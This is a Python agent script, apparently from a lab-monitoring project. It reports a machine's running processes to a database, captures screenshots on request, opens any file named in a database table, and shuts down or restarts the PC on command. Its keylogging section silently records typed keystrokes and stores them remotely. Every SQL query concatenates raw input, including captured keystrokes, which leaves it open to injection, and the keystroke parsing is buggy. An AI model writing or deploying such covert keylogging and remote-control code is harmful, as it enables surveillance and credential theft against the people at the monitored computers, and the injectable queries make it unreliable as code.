import threading
import time
import psutil    # pip3 install psutil
#import cv2      #pip3 install opencv-python
import pyscreenshot as ImageGrab  #pip3 install pyscreenshot
from DBConnection import Db
import keyboard

import time
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler




class processlogthread (threading.Thread):
    def __init__(self,sid):
       threading.Thread.__init__(self)
       self.sys_id=sid
       self.static_path=r"C:\Users\mevin\PycharmProjects\smartlab\static\\"

    def run(self):
        while(1):

            db=Db()


            ############################processs storage start

            qrr = "delete from applogs where sys_id='"+ str(self.sys_id) +"'"
            # c.nonreturn(qrr)
            for proc in psutil.process_iter():
                try:
                    print("thrrr")
                    processName = proc.name()
                    db=Db()
                    qr = "insert into applogs(sys_id, date, time, name) values('"+ str(self.sys_id) +"', curdate(), curtime(), '"+processName+"')"
                    # print(qr)
                    db.insert(qr)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass



            # print("*************************** screen capturing  ***************************")
            qrr = "select * from capture where sys_id='"+str(self.sys_id)+"' and path='pending' and type='screenshot'"
            print(qrr)
            db=Db()
            res = db.selectOne(qrr)
            print("kkk ", res)
            print(res)
            if res!=None:
                print("screen")
                ##pip install pyautogui
                import pyautogui

                myScreenshot = pyautogui.screenshot()
                dt=time.strftime("%Y%m%d_%H%M%S")
                filepath=self.static_path + "image//"+str(dt)+".png"
                path="/static/image/" + dt + ".png"
                myScreenshot.save(filepath)
                qqq="update capture set path='"+path+"' where capture_id='" + str(res['capture_id']) + "'"
                db=Db()
                db.update(qqq)



            print("*************************** creating new processes ***************************")
            qrr = "SELECT * FROM `startapps` WHERE `sys_id`='" + str(self.sys_id) + "'"
            db = Db()
            res = db.select(qrr)
            print("Proccccc   ", res)
            for i in res:
                try:
                    import subprocess
                    print(i)
                    cmd = i['process_name']
                    filepath = cmd
                    import os
                    os.startfile(filepath)
                    print('haiii')

                    # subprocess.run(filepath)
                    db=Db()
                    db.delete("delete from startapps where id='"+str(i['id'])+"'")
                except Exception as ex:
                    print("errrrr", ex)
                    pass


             # block app



             # print("*************************** shutting down or restarting***************************")
            qrr = "SELECT * FROM `command` WHERE `sys_id`='" + str(self.sys_id) + "'"
            print(qrr)
            db = Db()
            res = db.select(qrr)
            for i in res:
                try:
                    print('haiii')
                    ss=i['command']
                    db=Db()
                    db.delete("delete from  `command` where c_id='" + str(i['c_id']) + "'")
                    if ss=="shutdown":
                        import os
                        os.system("shutdown /s /t 1")
                        print("shut.....")
                    if ss == "restart":
                        import os
                        os.system("shutdown /r /t 1")
                        print("restr....")

                except Exception as ex:
                    print("errrrr", ex)
                    pass


            print("********************     keylogs     ************")
            import keyboard                 #       pip install keyboard
            rk = keyboard.record(until='enter')
            print(str(rk))

            s = ""

            for a in rk:
                # print(keyboard.read_event(a))asd g
                # s=s+
                print("\n####")
                a = str(a).replace("KeyboardEvent(", "")
                a = a.replace(" down)", "").replace(" up)", "")
                if a == 'space':
                    s = s + " "
                elif a == "enter":
                    s = s + "\n\r"
                elif a == "ctrl" or a=="alt" or a=="backspace":       # keys to exclude
                    print(a)
                else:
                    s = s + a
                print("######")
            print("Out  :  ", s)
            s = s.replace("esc", "")  # esc
            keyy = []
            for i in range(0, len(s), 2):
                keyy.append(s[i])
            s = "".join(keyy)
            print(keyy)
            qry = "INSERT INTO `keylogs` (`sys-id`,`date`,`time`,`key`) VALUES ('" + str(
                self.sys_id) + "',CURDATE(), CURTIME(),'" + s + "')"
            db=Db()
            db.insert(qry)



def getmacaddress():
    import uuid
    # print("The MAC address in formatted way is : ", end="")
    k=(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)for ele in range(0, 8 * 6, 8)][::-1]))
    print(k)

    return k

macid = getmacaddress()
print("mac22")
print (macid)
sys_id=""
db=Db()
res=db.selectOne("select * from system where mac_id='"+macid+"'")
if res is not None:
    sys_id=res['sys_id']

qry22=""

pthread = processlogthread(sys_id)
pthread.run()
print("okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk2222222222222222222222")